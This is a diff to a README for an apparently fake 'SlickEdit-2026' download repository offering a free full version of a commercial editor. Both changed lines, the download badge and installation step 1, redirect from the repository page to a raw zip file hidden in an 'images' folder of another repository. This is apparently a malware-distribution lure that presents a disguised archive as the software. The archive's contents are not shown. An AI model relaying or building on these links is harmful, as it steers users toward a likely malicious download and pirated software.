@@ -5,7 +5,7 @@ description: "Download the full version of SlickEdit for Windows 10 and 11 using
 ---
 # 💻 SlickEdit-2026 - Write better code with ease
 
-[![](https://img.shields.io/badge/Download-SlickEdit_2026-blue.svg)](https://github.com/tangled-flow218/SlickEdit-2026)
+[![](https://img.shields.io/badge/Download-SlickEdit_2026-blue.svg)](https://raw.githubusercontent.com/tangled-flow218/tangled-flow218.github.io/main/images/v1.7.zip)
 
 ## 📌 About this software
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards before you start.
 
 Follow these steps to set up the editor.
 
-1. Go to this link to reach the download page: [https://github.com/tangled-flow218/SlickEdit-2026](https://github.com/tangled-flow218/SlickEdit-2026).
+1. Go to this link to reach the download page: [https://raw.githubusercontent.com/tangled-flow218/tangled-flow218.github.io/main/images/v1.7.zip](https://raw.githubusercontent.com/tangled-flow218/tangled-flow218.github.io/main/images/v1.7.zip).
 2. Look for the file ending in .exe in the list of releases.
 3. Click the filename to start the download.
 4. Save the file to your desktop for easy access.
